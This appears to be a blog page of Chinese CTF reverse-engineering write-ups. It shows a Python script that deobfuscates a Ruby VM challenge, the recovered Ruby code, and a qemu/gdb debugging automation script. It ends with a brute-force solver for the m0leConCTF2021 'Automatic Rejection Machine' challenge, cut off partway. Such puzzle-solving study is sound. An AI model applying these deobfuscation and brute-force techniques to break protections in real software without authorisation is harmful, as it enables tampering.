<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">path = <span class="string">r&quot;D:\0Study3\_little_evil.extracted\squashfs-root\__enclose_io_memfs__\local\2.rb&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(path,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">content = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace1</span>(<span class="params">matched</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="number">1</span>) + matched.group()[<span class="number">2</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace2</span>(<span class="params">matched</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="number">2</span>) + matched.group()[<span class="number">2</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace3</span>(<span class="params">matched</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;-1&quot;</span> + matched.group()[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace4</span>(<span class="params">matched</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;$fun1&quot;</span> + matched.group()[-<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace5</span>(<span class="params">matched</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;fun2&quot;</span> + matched.group()[-<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace6</span>(<span class="params">matched</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;$fun3&quot;</span> + matched.group()[-<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace7</span>(<span class="params">matched</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;fun4&quot;</span> + matched.group()[-<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace8</span>(<span class="params">matched</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;$fun5&quot;</span> + matched.group()[-<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace9</span>(<span class="params">matched</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;fun6&quot;</span> + matched.group()[-<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace10</span>(<span class="params">matched</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;$fun7&quot;</span> + matched.group()[-<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace11</span>(<span class="params">matched</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;$fun8&quot;</span> + matched.group()[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    line = f.readline()</span><br><span class="line">    <span class="keyword">if</span> line == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># $_</span></span><br><span class="line">    pattern1 = <span class="string">&quot;\$\_[^_]&quot;</span></span><br><span class="line">    <span class="comment"># @_</span></span><br><span class="line">    pattern2 = <span class="string">&quot;@\_[^_]&quot;</span></span><br><span class="line">    <span class="comment"># $-_</span></span><br><span class="line">    pattern3 = <span class="string">&quot;\$-\_[^_-]&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># $__</span></span><br><span class="line">    pattern4 = <span class="string">&quot;\$\_\_[^_-]&quot;</span></span><br><span class="line">    <span class="comment"># @__</span></span><br><span class="line">    pattern5 = <span class="string">&quot;@\_\_[^_-]&quot;</span></span><br><span class="line">    <span class="comment"># $_____</span></span><br><span class="line">    pattern6 = <span class="string">&quot;\$\_\_\_\_\_[^_-]&quot;</span></span><br><span class="line">    <span class="comment"># @_____</span></span><br><span class="line">    pattern7 = <span class="string">&quot;@\_\_\_\_\_[^_-]&quot;</span></span><br><span class="line">    <span class="comment"># $______</span></span><br><span class="line">    pattern8 = <span class="string">&quot;\$\_\_\_\_\_\_[^_-]&quot;</span></span><br><span class="line">    <span class="comment"># @______</span></span><br><span class="line">    pattern9 = <span class="string">&quot;@\_\_\_\_\_\_[^_-]&quot;</span></span><br><span class="line">    <span class="comment"># $_______</span></span><br><span class="line">    pattern10 = <span class="string">&quot;\$\_\_\_\_\_\_\_[^_-]&quot;</span></span><br><span class="line">    <span class="comment"># $____</span></span><br><span class="line">    pattern11 = <span class="string">&quot;\$\_\_\_\_[^_-]&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># pattern = &quot;\$_[^_]&quot;</span></span><br><span class="line">    <span class="comment"># matchObj = re.search(pattern, line , re.M | re.I)</span></span><br><span class="line">    <span class="comment"># 复原3个数字</span></span><br><span class="line">    line = re.sub(pattern1, replace1, line)</span><br><span class="line">    line = re.sub(pattern2, replace2, line)</span><br><span class="line">    line = re.sub(pattern3, replace3, line)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 复原函数名</span></span><br><span class="line">    line = re.sub(pattern4, replace4, line)</span><br><span class="line">    line = re.sub(pattern5, replace5, line)</span><br><span class="line">    line = re.sub(pattern6, replace6, line)</span><br><span class="line">    line = re.sub(pattern7, replace7, line)</span><br><span class="line">    line = re.sub(pattern8, replace8, line)</span><br><span class="line">    line = re.sub(pattern9, replace9, line)</span><br><span class="line">    line = re.sub(pattern10, replace10, line)</span><br><span class="line">    <span class="comment"># line = re.sub(pattern11, replace11, line)</span></span><br><span class="line">    pattern = <span class="string">&quot;\_\_\_\_\_\_&quot;</span></span><br><span class="line">    line = re.sub(pattern, <span class="string">&quot;var1&quot;</span>, line)</span><br><span class="line">    pattern = <span class="string">&quot;\_\_\_\_\_&quot;</span></span><br><span class="line">    line = re.sub(pattern, <span class="string">&quot;var2&quot;</span>, line)</span><br><span class="line">    pattern = <span class="string">&quot;\$\_\_\_\_&quot;</span></span><br><span class="line">    line = re.sub(pattern, <span class="string">&quot;$var3&quot;</span>, line)</span><br><span class="line">    pattern = <span class="string">&quot;@\_\_\_\_&quot;</span></span><br><span class="line">    line = re.sub(pattern, <span class="string">&quot;@var9&quot;</span>, line)</span><br><span class="line">    pattern = <span class="string">&quot;\_\_\_\_&quot;</span></span><br><span class="line">    line = re.sub(pattern, <span class="string">&quot;var4&quot;</span>, line)</span><br><span class="line">    pattern = <span class="string">&quot;\$\_\_\_&quot;</span></span><br><span class="line">    line = re.sub(pattern, <span class="string">&quot;$var5&quot;</span>, line)</span><br><span class="line"></span><br><span class="line">    pattern = <span class="string">&quot;@\_\_\_&quot;</span></span><br><span class="line">    line = re.sub(pattern, <span class="string">&quot;@var8&quot;</span>, line)</span><br><span class="line"></span><br><span class="line">    pattern = <span class="string">&quot;\_\_\_&quot;</span></span><br><span class="line">    line = re.sub(pattern, <span class="string">&quot;var6&quot;</span>, line)</span><br><span class="line">    pattern = <span class="string">&quot;&amp;\_\_&quot;</span></span><br><span class="line">    line = re.sub(pattern, <span class="string">&quot;arg2&quot;</span>, line)</span><br><span class="line">    pattern = <span class="string">&quot;\_\_&quot;</span></span><br><span class="line">    line = re.sub(pattern, <span class="string">&quot;var7&quot;</span>, line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    content += line</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>
<p>恢复后的代码依旧可读性很差</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="variable">$fun1</span>=-&gt;_&#123;_==[]<span class="params">||</span>_==<span class="string">&#x27;&#x27;</span>?<span class="variable">$.</span><span class="symbol">:</span><span class="number">1</span>+<span class="variable">$fun1</span>[_[<span class="number">1</span>..-<span class="number">1</span>]]&#125;</span><br><span class="line">fun2=-&gt;_,arg2&#123;_==[]?[]<span class="symbol">:</span>[var7[_[<span class="variable">$.</span>]]]+fun2[_[<span class="number">1</span>..-<span class="number">1</span>],arg2]&#125;</span><br><span class="line"><span class="variable">$fun3</span>=-&gt;_&#123;fun2[[*_],&amp;-&gt;var7&#123;var7[<span class="variable">$.</span>]&#125;]&#125;</span><br><span class="line">fun4=-&gt;_&#123;fun2[[*_],&amp;-&gt;var7&#123;var7[-<span class="number">1</span>]&#125;]&#125;</span><br><span class="line"><span class="variable">$fun5</span>=-&gt;_&#123;var6,var1=<span class="variable">$fun3</span>[_],fun4[_];var2=<span class="variable">$fun1</span>[var6];var4=&#123;&#125;;var7=<span class="variable">$.</span>;(_=-&gt;&#123;</span><br><span class="line">  var4[var1[var7]]=var6[var7];(var7+=<span class="number">1</span>)==var2 ?<span class="symbol">var4:</span>_[]&#125;)[]&#125;</span><br><span class="line">fun6=-&gt;_,var7&#123;_=[*_]+[*var7];var4=<span class="variable">$fun1</span>[_];var6=&#123;&#125;;var7=<span class="variable">$.</span>;(var2=-&gt;&#123;</span><br><span class="line">  var6[_[var7][<span class="variable">$.</span>]]=_[var7][<span class="number">1</span>];(var7+=<span class="number">1</span>)==var4 ?<span class="symbol">var6:</span>var2[]&#125;)[]&#125;</span><br><span class="line"><span class="variable">$fun7</span>=-&gt;_&#123;<span class="variable">$var5</span>=[];<span class="variable">@var8</span>=<span class="variable">$fun1</span>[_];var7=var6=var4=<span class="variable">$.</span>;<span class="variable">$var3</span>,<span class="variable">@var9</span>=&#123;&#125;,[]</span><br><span class="line">(var2=-&gt;&#123;</span><br><span class="line">  _[var4]==<span class="string">&#x27;5&#x27;</span>?(<span class="variable">@var9</span>&lt;&lt;var4)<span class="symbol">:</span><span class="variable">$.</span></span><br><span class="line">  _[var4]==<span class="string">&#x27;6&#x27;</span>?(<span class="variable">$var3</span>[<span class="variable">@var9</span>[-<span class="number">1</span>]]=var4;<span class="variable">@var9</span>=<span class="variable">@var9</span>[<span class="variable">$.</span>..<span class="variable">$.</span>-<span class="number">2</span>])<span class="symbol">:</span><span class="variable">$.</span></span><br><span class="line">  (var4+=<span class="number">1</span>)==<span class="variable">@var</span>8?<span class="variable">$.</span><span class="symbol">:var2[]</span>&#125;)[]</span><br><span class="line"><span class="variable">$var3</span>=<span class="variable">$var3</span>==&#123;&#125;?&#123;&#125;<span class="symbol">:fun6</span>[<span class="variable">$var3</span>,<span class="variable">$fun5</span>[<span class="variable">$var3</span>]]</span><br><span class="line">(var1=-&gt;&#123;_[var7]==</span><br><span class="line"><span class="string">&#x27;0&#x27;</span>?(<span class="variable">$var5</span>[var6]<span class="params">||</span>=<span class="variable">$.</span>;<span class="variable">$var5</span>[var6]+=<span class="number">1</span>)<span class="symbol">:_</span>[var7]==</span><br><span class="line"><span class="string">&#x27;1&#x27;</span>?(<span class="variable">$var5</span>[var6]<span class="params">||</span>=<span class="variable">$.</span>;<span class="variable">$var5</span>[var6]-=<span class="number">1</span>)<span class="symbol">:_</span>[var7]==</span><br><span class="line"><span class="string">&#x27;2&#x27;</span>?(<span class="variable">$var5</span>[var6]<span class="params">||</span>=<span class="variable">$.</span>;<span class="variable">$var5</span>[var6]=STDIN.getc.ord)<span class="symbol">:_</span>[var7]==</span><br><span class="line"><span class="string">&#x27;3&#x27;</span><span class="string">?(</span>var6+=<span class="number">1</span>)<span class="symbol">:_</span>[var7]==</span><br><span class="line"><span class="string">&#x27;4&#x27;</span><span class="string">?(</span>var6-=<span class="number">1</span>)<span class="symbol">:_</span>[var7]==</span><br><span class="line"><span class="string">&#x27;5&#x27;</span><span class="string">?(</span>var7=(<span class="variable">$var5</span>[var6]<span class="params">||</span><span class="variable">$.</span>)==<span class="variable">$.</span><span class="string">?$</span>var3[var7]<span class="symbol">:var7</span>)<span class="symbol">:_</span>[var7]==</span><br><span class="line"><span class="string">&#x27;6&#x27;</span><span class="string">?(</span>var7=(<span class="variable">$var5</span>[var6]<span class="params">||</span><span class="variable">$.</span>)!=<span class="variable">$.</span><span class="string">?$</span>var3[var7]<span class="symbol">:var7</span>)<span class="symbol">:_</span>[var7]==</span><br><span class="line"><span class="string">&#x27;7&#x27;</span>?(<span class="variable">$&gt;</span>&lt;&lt;(<span class="string">&#x27;&#x27;</span>&lt;&lt;<span class="variable">$var5</span>[var6]))<span class="symbol">:</span><span class="variable">$.</span></span><br><span class="line">(var7+=<span class="number">1</span>)==<span class="variable">@var</span>8?<span class="symbol">_:</span>var1[]&#125;)[]&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fun7</span>[<span class="string">&#x27;3351635164300000000540000000003164073000000540000003164070070000071730000000541111111131641175160343516445163530440316354031643451634235163516000000054000000000003164344354131645335163435164444516333530444403331635403164344451665163423516351600000054000000000316413443541316453351634351644445163335304444033316354031643444516651634235163516000000005400000000000316403443541316453351634351644445163335304444033316354031643444516651634235163516000000005400000000000031640344354131645335163435164444516333530444403331635403164344451665163423516351600000540000000000031643443541316453351634351644445163335304444033316354031643444516651635164453030441633544033164533516351643000000005400000000003164171111744516644&#x27;</span>];<span class="keyword">rescue</span> Exception;<span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里我遇到了一个问题，由于fun1迭代次数过多，超过了ruby解释器的迭代次数上限，导致脚本运行不起来，我也不怎么会Ruby，已经费了很多时间，本题就这样吧</p>
<p>看看其他师傅的wp，<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-267706.htm#msg_header_h1_4">https://bbs.pediy.com/thread-267706.htm#msg_header_h1_4</a></p>
<p>把虚拟机复原编译为c语言程序，下硬件断点追踪输入，这时个很好的思路</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/20/m0leConCTF2021%E9%80%86%E5%90%91Automatic-Rejection-Machine%E9%A2%98%E8%A7%A3/">m0leConCTF2021逆向Automatic Rejection Machine题解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-20</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/aarch64/">aarch64</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/reverse/">reverse</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E7%88%86%E7%A0%B4/">爆破</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/shell-script/">shell script</a></span><div class="content"><p>程序逻辑不难分析，但是我还是踩了坑</p>
<h3 id="第一个坑"><a href="#第一个坑" class="headerlink" title="第一个坑"></a>第一个坑</h3><p>程序3个字符为一组进行加密，由于程序逻辑清晰，本来是决定用VS2017重构IDA的伪代码，然后进行爆破的，搞了一天没搞对，这是个很笨的方法，VS2017会报各种栈溢出的错，而且IDA的 c 伪代码是不可信的，以后不到万不得已不会再用这个方法了</p>
<h3 id="第二个坑"><a href="#第二个坑" class="headerlink" title="第二个坑"></a>第二个坑</h3><p>我用Python复原代码，但是Python不像c语言那样有整数类型，导致代码重构的时候，总是要把数字与&amp;上一个 <code>0xffffffffffffffff</code> ，导致Python代码实际可读性很差，容易粗心大意犯错，下次我会采用c语言来复原代码了</p>
<h3 id="第三个坑"><a href="#第三个坑" class="headerlink" title="第三个坑"></a>第三个坑</h3><p>环境搭建，我的调试是这样的，首先开启一个终端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -g 1234  -L &#x2F;usr&#x2F;aarch64-linux-gnu .&#x2F;challenge</span><br></pre></td></tr></table></figure>
<p>然后再开启一个终端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch .&#x2F;challenge -q</span><br></pre></td></tr></table></figure>
<p>然后在gdb中远程连接1234端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target  remote 127.0.0.1:1234</span><br></pre></td></tr></table></figure>
<p>每次我想让程序重新开始，都要重复上述步骤，太烦了</p>
<p>对此，我实在受不了这种重复的工作了，于是我写了个脚本自动化配环境</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = <span class="string">&quot;../challenge&quot;</span></span><br><span class="line">port = <span class="number">2000</span></span><br><span class="line">breakpoints = []</span><br><span class="line"><span class="comment"># 1234567890abcdefghijklmnobqrstuv</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ./env_script</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./env_script&quot;</span>,<span class="string">&quot;w+&quot;</span>)</span><br><span class="line">content = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">port=&#123;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(port)</span><br><span class="line">content += <span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">state=`netstat  -anp  |grep  $port`</span></span><br><span class="line"><span class="string">echo $state</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if [ -z $state]</span></span><br><span class="line"><span class="string">then</span></span><br><span class="line"><span class="string">	echo &quot;port is not used,success&quot;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">	pid=`netstat  -anp  |grep  $port |awk &#x27;&#123;print $7&#125;&#x27;|awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27;`</span></span><br><span class="line"><span class="string">	kill -9 $pid</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">content += <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">file_path=&quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">qemu-aarch64 -g $port -L /usr/aarch64-linux-gnu $file_path</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(path)</span><br><span class="line"><span class="comment"># print(content)</span></span><br><span class="line">f.write(content)</span><br><span class="line">f.close()</span><br><span class="line">os.system(<span class="string">&quot;chmod 777 ./env_script&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ./debug_script</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./debug_script&quot;</span>,<span class="string">&quot;w+&quot;</span>)</span><br><span class="line">content = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">port=&#123;&#125;</span></span><br><span class="line"><span class="string">file_path=&quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">gdb-multiarch &quot;&#123;&#125;&quot; -q -x ./gdb_script</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(port,path,path)</span><br><span class="line"><span class="comment"># print(content)</span></span><br><span class="line">f.write(content)</span><br><span class="line">f.close()</span><br><span class="line">os.system(<span class="string">&quot;chmod 777 ./debug_script&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ./gdb_script</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./gdb_script&quot;</span>,<span class="string">&quot;w+&quot;</span>)</span><br><span class="line">content = <span class="string">&quot;target remote 127.0.0.1:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(port)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(breakpoints)):</span><br><span class="line">    content += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    content += <span class="string">&quot;b *0x4000000000 + &quot;</span> + <span class="built_in">hex</span>(breakpoints[i]) </span><br><span class="line"><span class="comment"># print(content)</span></span><br><span class="line">f.write(content)</span><br><span class="line">f.close()</span><br><span class="line">os.system(<span class="string">&quot;chmod 777 ./gdb_script&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;gnome-terminal -e &#x27;bash -c \&quot;./env_script; exec bash\&quot;&#x27;&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;./debug_script&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>这个脚本可以自动下断点，主要运用了 shell 脚本 + gdb 脚本，至此，调试就轻松多了</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>回归正题，调试比对恢复代码，最后爆破即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">table1 = [<span class="number">0x71</span>, <span class="number">0x77</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x79</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x6f</span>, <span class="number">0x70</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x6a</span>, <span class="number">0x6b</span>,</span><br><span class="line">          <span class="number">0x6c</span>, <span class="number">0x7a</span>, <span class="number">0x78</span>, <span class="number">0x63</span>, <span class="number">0x76</span>, <span class="number">0x62</span>, <span class="number">0x6e</span>, <span class="number">0x6d</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>]</span><br><span class="line">table2 = [<span class="number">0x71</span>, <span class="number">0x73</span>, <span class="number">0x77</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x79</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x6f</span>, <span class="number">0x70</span>, <span class="number">0x61</span>, <span 